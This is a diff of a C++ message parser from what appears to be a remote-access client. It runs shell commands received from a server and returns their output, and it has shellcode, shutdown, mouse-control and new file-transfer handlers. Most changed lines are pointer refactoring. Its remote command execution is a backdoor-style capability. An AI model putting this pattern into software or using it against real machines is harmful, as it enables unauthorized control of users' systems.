@@ -1,5 +1,6 @@
 #include "commands.h"
 #include "utils.h"
+#include "fileTransfer.h"
 
 int parseMessages(Server *c, std::string buffer)
 {
@@ -14,11 +15,11 @@ int parseMessages(Server *c, std::string buffer)
     {
         std::string sends = "/connect ";
         sends += &buf[5];
-        c.connectUDP(c.hostTCP, "10152");
+        c->connectUDP(c->hostTCP, "4445");
 
-        c.receiveUDP(&parseUDPMessages);
+        c->receiveUDP(&parseUDPMessages);
 
-        c.sendUDP(sends);
+        c->sendUDP(sends);
     }
     else if (strncmp(buf, "/cmd", 4) == 0)
     {
@@ -28,7 +29,7 @@ int parseMessages(Server *c, std::string buffer)
         if (f == 0)
         {
             char msg[] = ":ERROR:";
-            c.sendTCP(msg);
+            c->sendTCP(msg);
             return 0;
         }
         const int BUFSIZE = 1000;
@@ -40,7 +41,7 @@ int parseMessages(Server *c, std::string buffer)
         }
         char *sends = new char[strlen(ret.c_str())];
         strncpy(sends, ret.c_str(), strlen(ret.c_str()));
-        c.sendTCP(sends);
+        c->sendTCP(sends);
         pclose(f);
     }
     else if (strncmp(buf, "/shellcode", 10) == 0)
@@ -73,15 +74,15 @@ int parseMessages(Server *c, std::string buffer)
 
         std::cout << sends << "\n";
 
-        c.sendTCP(sends);
+        c->sendTCP(sends);
     }
     else if (strncmp(buf, "/requesting_reset", 17) == 0)
     {
-        c.resetTCP();
+        c->resetTCP();
     }
     else if (strncmp(buf, "/requesting_data", 16) == 0)
     {
-        c.sendTCPIntro();
+        c->sendTCPIntro();
     }
     else if (strncmp(buf, "/shutdown", 9) == 0)
     {
@@ -101,7 +102,14 @@ int parseMessages(Server *c, std::string buffer)
 
 int parseUDPMessages(Server *c, std::string recv)
 {
-    if (strncmp(recv.c_str(), "/cursor_stream", 14) == 0)
+    printf("PARSING: %s\n", recv.c_str());
+    if (!parseFile(c, recv)) {
+        //This if-statement is mainly here to ensure we don't
+        //check the command against other commands.
+        //Saves some processing time.
+        return 1;
+    }
+    else if (strncmp(recv.c_str(), "/cursor_stream", 14) == 0)
     {                                                       ///////////////////-----------IMPORTANT NOTE: Only high-priority commands may reside here.
                                                             ///////////////////-----------: `parse_commands` is built shabbily and will cause lag if it is used.
                                                             ///////////////////-----------: This in mind, it's still very useful, but we need to list high-priority
@@ -146,8 +154,9 @@ int parseUDPMessages(Server *c, std::string recv)
     {
         m_rmouseUp();
     }
-    else
+    else {
         return 1;
+    }
 
     return 0;
 }
